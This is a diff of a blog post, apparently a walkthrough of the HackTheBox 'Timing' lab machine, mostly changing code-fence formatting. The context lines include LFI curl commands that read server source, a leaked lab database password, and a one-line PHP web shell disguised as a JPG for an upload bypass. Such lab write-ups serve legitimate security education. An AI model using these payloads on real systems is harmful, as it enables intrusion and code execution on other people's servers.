@@ -2,7 +2,7 @@
 title: "HackTheBox Timing Write-Up"
 date: 2022-06-04
 slug: hackthebox-timing-write-up
-excerpt: "This is my write-up for the Timing machine on HackTheBox that just retired! Here I detail the penetration testing steps taken to scan, exploit, and privilege\u2026"
+excerpt: "A full walkthrough of the Timing machine (easy) on HackTheBox: LFI, a time-based MD5 auth bypass, and abusing a SUID app's file write for root."
 source: https://medium.com/@NicPWNs/hackthebox-timing-write-up-76c07ce2b107?source=rss-57a2a039424d------2
 tags: ["hackthebox"]
 ---
@@ -31,7 +31,7 @@ A local file inclusion (LFI) vulnerability on a PHP page allows for full enumera
 
 Nmap scans find SSH open on port 22/tcp and an HTTP webserver running on port 80/tcp.
 
-```
+```bash
 # nmap -sV -sC -p- 10.10.11.135
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-03 18:39 EDT
 Nmap scan report for 10.10.11.135
@@ -52,9 +52,6 @@ PORT   STATE SERVICE VERSION
 |_      httponly flag not set
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
-```
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 31.02 seconds
 ```
@@ -71,7 +68,7 @@ The webserver found at port 80/tcp is a very simple login page.
 
 Nikto scans don’t find much new information about the target.
 
-```
+```bash
 # nikto --host http://10.10.11.135/
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -101,7 +98,7 @@ Nikto scans don’t find much new information about the target.
 
 Gobuster reveals a number of PHP pages for us to check out.
 
-```
+```bash
 # gobuster dir -u http://10.10.11.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
 ===============================================================
 Gobuster v3.1.0
@@ -148,25 +145,16 @@ image.php is the only page that does not redirect back to the login page. Perhap
 
 We can use Ffuf to scan for hidden parameters at image.php. It finds a usable parameter called img.
 
-```
+```bash
 # ffuf -u http://10.10.11.135/image.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
-```
-
-```
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
          \ \_\   \ \_\  \ \____/  \ \_\
           \/_/    \/_/   \/___/    \/_/       
-```
-
-```
        v1.3.1 Kali Exclusive <3
 ________________________________________________
-```
-
-```
  :: Method           : GET
  :: URL              : http://10.10.11.135/image.php?FUZZ=/etc/passwd
  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
@@ -177,9 +165,6 @@ ________________________________________________
  :: Matcher          : Response status: 200,204,301,302,307,401,403,405
  :: Filter           : Response size: 0
 ________________________________________________
-```
-
-```
 img                     [Status: 200, Size: 25, Words: 3, Lines: 1]
 :: Progress: [2588/2588] :: Job [1/1] :: 736 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
 ```
@@ -224,26 +209,17 @@ Even logged in as aaron, we still don't have an obvious way to achieve code exec
 
 login.php points us to db\_conn.php which might contain a password for the database.
 
-```
+```bash
 # curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=login.php | base64 -d
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  2764  100  2764    0     0  25005      0 --:--:-- --:--:-- --:--:-- 25127
 <?php
-```
-
-```
 include "header.php";
-```
-
-```
 function createTimeChannel()
 {
     sleep(1);
 }
-```
-
-```
 include "db_conn.php";
 ```
 
@@ -251,7 +227,7 @@ include "db_conn.php";
 
 db\_conn.php reveals a password! Unfortunately, this password doesn't seem to work anywhere else that we know of and we can't access the DB.
 
-```
+```bash
 # curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=db_conn.php | base64 -d
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -264,59 +240,35 @@ $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0
 
 upload.php is another PHP page to check. It shows that the page admin\_auth\_check.php is included first and then some other operations are done for file uploads. This information will be useful later.
 
-```
+```bash
 # curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php | base64 -d
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  1360  100  1360    0     0  14023      0 --:--:-- --:--:-- --:--:-- 14166
 <?php
 include("admin_auth_check.php");
-```
-
-```
 $upload_dir = "images/uploads/";
-```
-
-```
 if (!file_exists($upload_dir)) {
     mkdir($upload_dir, 0777, true);
 }
-```
-
-```
 $file_hash = uniqid();
-```
-
-```
 $file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
 $target_file = $upload_dir . $file_name;
 $error = "";
 $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
-```
-
-```
 if (isset($_POST["submit"])) {
     $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
     if ($check === false) {
         $error = "Invalid file";
     }
 }
-```
-
-```
 // Check if file already exists
 if (file_exists($target_file)) {
     $error = "Sorry, file already exists.";
 }
-```
-
-```
 if ($imageFileType != "jpg") {
     $error = "This extension is not allowed.";
 }
-```
-
-```
 if (empty($error)) {
     if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
         echo "The file has been uploaded.";
@@ -333,16 +285,13 @@ if (empty($error)) {
 
 admin\_auth\_check.php finally looks like the key to the next step. It suggests that our user profile must have a role parameter set to 1 in order to pass as an admin.
 
-```
+```bash
 # curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php | base64 -d
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100   268  100   268    0     0   2627      0 --:--:-- --:--:-- --:--:--  2653
 <?php
 include_once "auth_check.php";
-```
-
-```
 if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
     echo "No permission to access this panel!";
     header('Location: ./index.php');
@@ -375,32 +324,17 @@ After forwarding the new POST request from Burp and refreshing the page, we have
 
 The key part to analyze within upload.php is below. It requires a JPG file to be uploaded which gets saved to /images/uploads/ on the server. However, first it renames our file to an MD5 hash of '$file\_hash' concatenated with the current time. This MD5 hash then gets concatenated with the original name of our file for upload.
 
-```
+```bash
 $upload_dir = "images/uploads/";
-```
-
-```
 if (!file_exists($upload_dir)) {
     mkdir($upload_dir, 0777, true);
 }
-```
-
-```
 $file_hash = uniqid();
-```
-
-```
 $file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
 $target_file = $upload_dir . $file_name;
 $error = "";
 $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
-```
-
-```
 ----- SNIP -----
-```
-
-```
 if ($imageFileType != "jpg") {
     $error = "This extension is not allowed.";
 }
@@ -408,7 +342,7 @@ if ($imageFileType != "jpg") {
 
 We should be able to bypass the JPG check by simply renaming our own PHP code to a JPG extension. We can then reverse engineer the time-based MD5 hashing to find the correct file name uploaded on the server to make use of our PHP code. It’s also important to note that the $file\_hash variable within the MD5 function is in single quotes and therefore will be interpreted as a string, rather than its assigned value which we would not know. We'll replicate this mistake and simply pass the string to our function as well. First, we make the JPG file containing a basic PHP web shell.
 
-```
+```bash
 # cat shell.jpg
 <?php system($_GET[cmd]);?>
 ```
@@ -450,29 +384,17 @@ After trying many different types of reverse shells in the code execution, it se
 
 To download this ZIP file, I copied it to the root of the webserver /var/www/html and downloaded it. Unzipping it shows a .git directory. Because this is a backup of the website, there may be some git history of some old passwords or other information in these files. Performing a git log shows commit history, and then viewing the specific commit for an update to the db\_conn file shows that there is an old password!
 
-```
+```bash
 # git log
 commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
 Author: grumpy <grumpy@localhost.com>
 Date:   Tue Jul 20 22:34:13 2021 +0000
-```
-
-```
     db_conn updated
-```
-
-```
 # git show 16de2698b5b122c93461298eab730d00273bd83e
 commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
 Author: grumpy <grumpy@localhost.com>
 Date:   Tue Jul 20 22:34:13 2021 +0000
-```
-
-```
     db_conn updated
-```
-
-```
 diff --git a/db_conn.php b/db_conn.php
 index f1c9217..5397ffa 100644
 --- a/db_conn.php
@@ -499,9 +421,6 @@ One of the first things to always try when enumerating for privilege escalation 
 aaron@timing:~$ sudo -l
 Matching Defaults entries for aaron on timing:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-```
-
-```
 User aaron may run the following commands on timing:
     (ALL) NOPASSWD: /usr/bin/netutils
 ```
@@ -532,16 +451,9 @@ File size: unavailable
 Opening output file test.txt
 Server unsupported, starting from scratch with one connection.
 Starting download
-```
-
-```
 Connection 0 finished
-```
-
-````
 Downloaded 0 byte in 0 seconds. (0.00 KB/s)
 ```
-````
 
 ## Root
 
@@ -598,5 +510,7 @@ Other than the points on HackTheBox, the lessons learned are the real treasures 
 
 1.  One issue I ran into along the way that I did not cover in the write-up was my first attempt at reversing the time-based MD5 function. I first attempted to generate the MD5 hash using Python because I am comfortable with it. However, this caused issues because the Python time function generates Epoch time with milliseconds in a different format, resulting in a different MD5. The lesson learned was to perform the reverse engineering in the same language that the original code was in (PHP) to avoid these unexpected issues.
 2.  Simple vulnerabilities/exploits used earlier in your attack chain can prove to be very useful later in the chain. In this case, we ended up using that same LFI vulnerability from the very beginning all the way to the point where we had to use it to execute our custom PHP code on the server.
+
+[![HackTheBox profile badge](https://www.hackthebox.com/badge/image/72382)](https://app.hackthebox.com/users/72382)
 
 Thank you for reading my write-up for the Timing machine on HackTheBox. Be sure to check out my other write-ups for [HackTheBox](/notes?tag=hackthebox)!
